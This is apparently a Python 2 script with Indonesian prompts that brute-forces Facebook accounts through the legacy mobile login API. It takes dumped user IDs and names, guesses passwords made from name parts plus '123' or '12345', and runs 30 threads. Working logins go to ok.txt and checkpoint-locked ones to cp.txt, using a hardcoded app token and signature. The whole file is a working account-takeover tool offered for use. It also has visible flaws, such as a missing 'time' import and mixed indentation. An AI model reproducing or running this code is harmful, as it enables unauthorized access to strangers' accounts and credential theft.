#!usr/bin/python2.7
# coding=utf-8

import requests, json, sys, os, re
from multiprocessing.pool import ThreadPool as th
from datetime import datetime

class Brute:
	def __init__(self):
		self.setpw = False
		self.ok = []
		self.cp = []
		self.loop = 0

	def bruteRequest(self, username, password):
		params = {
			'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'format': 'JSON',
			'sdk_version': '2',
			'email': username,
			'locale': 'en_US',
			'password': password,
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		try: os.mkdir('out')
		except: pass
		api = 'https://b-api.facebook.com/method/auth.login'
		response = requests.get(api, params=params)
		if re.search('(EAAA)\w+', response.text):
			self.ok.append(username+'|'+password)
			save = open('out/ok.txt','a')
			save.write(str(username)+'|'+str(password)+'\n')
			save.close()
			return True
		elif 'www.facebook.com' in response.json()['error_msg']:
			self.cp.append(username+'|'+password)
			save = open('out/cp.txt','a')
			save.write(str(username)+'|'+str(password)+'\n')
			save.close()
			return True
		else: return False

	def brute(self, users):
		if self.setpw == False:
			self.loop +=1
			for pw in users['pw']:
				username = users['id'].lower()
				password = pw.lower()
				try:
					if self.bruteRequest(username, password) == True:
						break
				except: pass
				sys.stdout.write(
					'\r\033[0;97m[\033[0;94m{}\033[0;97m] Crack {}/{}\033[0;92m OK \033[0;97m:\033[0;92m {}\033[0;93m CP \033[0;97m:\033[0;93m {} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
				); sys.stdout.flush()
		else:
			self.loop +=1
			for pw in self.setpw:
				username = users['id'].lower()
				password = pw.lower()
				try:
					if self.bruteRequest(username, password) == True:
						break
				except: pass
				sys.stdout.write(
					'\r\033[0;97m[\033[0;94m{}\033[0;97m] Crack {}/{}\033[0;92m OK \033[0;97m:\033[0;92m {}\033[0;93m CP \033[0;97m:\033[0;93m {} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
				); sys.stdout.flush()

	def main(self):
		while True:
			file = raw_input('\n\n\033[0;97m[\033[0;94m•\033[0;97m] Contoh Dump \033[0;91m:\033[0;97m [\033[0;93m dump/xnxx.json\033[0;97m ]\n[\033[0;91m?\033[0;97m]\033[0;97m Output Dump\033[0;91m :\033[0;92m ')
			try:
				list = open(file, 'r').read()
				object = json.loads(list)
				break
			except IOError:
				print("\n\033[0;91mFile\033[0;93m '%s'\033[0;91m Tidak Ada!\033[0m"% file)
		self.target = []
		for user in object:
			try:
				obj = user['name'].split(' ')
				if len(obj) == 1:
					listpass = [
						obj[0]+'123', obj[0]+'1234',
						obj[0]+'12345',
					]
				elif len(obj) == 2:
					listpass = [
						obj[0]+'123', obj[0]+'12345',
						obj[1]+'123', obj[1]+'12345',
					]
				elif len(obj) == 3:
					listpass = [
						obj[0]+'123', obj[0]+'12345',
						obj[1]+'123', obj[1]+'12345',
						obj[2]+'123', obj[2]+'12345',
					]
				elif len(obj) == 4:
					listpass = [
						obj[0]+'123', obj[0]+'12345',
						obj[1]+'123', obj[1]+'12345',
						obj[2]+'123', obj[2]+'12345',
						obj[3]+'123', obj[3]+'12345',
					]
				else:
					listpass = [
						'sayang', 'doraemon',
						'bangsat', 'kontol'
						'bismillah', 'cantik'
					]
				self.target.append({'id': user['uid'], 'pw': listpass})
			except: pass
		if len(self.target) == 0:
			exit("\n\033[0;91mId Tidak Ditemukan Dalam File\033[0;93m '%s'\033[0m"% file)
		ask = raw_input('\033[0;97m[\033[0;91m?\033[0;97m] Gunakan Password Defatuls atau Manual [d/m]\033[0;91m:\033[0;92m ')
		if ask.lower() == 'm':
			while True:
				print('\n\033[0;97m[\033[0;94m•\033[0;97m] \033[0;97mContoh Password\033[0;91m: \033[0;92msayang,doraemon,bangsat,kontol,bismillah,cantik\n')
				self.setpw = raw_input('\033[0;97m[\033[0;91m?\033[0;97m] \033[0;97mMasukan Password \033[0;91m:\033[0;92m ').strip().split(',')
				if self.setpw[0] != '':
					break
				
		th(30).map(self.brute, self.target)
		self.results()
		exit()

	def results(self):
		if (len(self.ok) != 0):
			print('\n\n\033[0;92mOK \033[0;91m:\033[0;92m '+str(len(self.ok)))
			for i in self.ok: print('\033[0;92m++ ' +str(i)+' ----> OK')
			print('\033[0;97mHasil OK Anda Disimpan Di \033[0;91m:\033[0;92m ok.txt')
                        print('\033[0;92m\n\n\n Terimakasih Sudah Memakai Tools Saya Jangan Lupa\n Subscribe My YouTube Channel...\n')
                        time.sleep(2)
                        os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
			os.system('exit')
		if (len(self.cp) != 0):
			print('\n\n\033[0;93mCP \033[0;91m:\033[0;93m '+str(len(self.cp)))
			for i in self.cp: print('\033[0;91m++\033[0;93m '+str(i)+' ----> CP')
			print('\033[0;97mHasil CP Anda Disimpan Di \033[0;91m:\033[0;93m cp.txt')
                        print('\033[0;92m\n\n\n Terimakasih Sudah Memakai Tools Saya Jangan Lupa\n Subscribe My YouTube Channel...\n')
                        time.sleep(2)
                        os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
			os.system('exit')
		if (len(self.cp) == 0 and len(self.ok) == 0):
			print('\n\033[0;97m Upss Kamu Tidak Mendapatkan Hasil :(\033[0m')
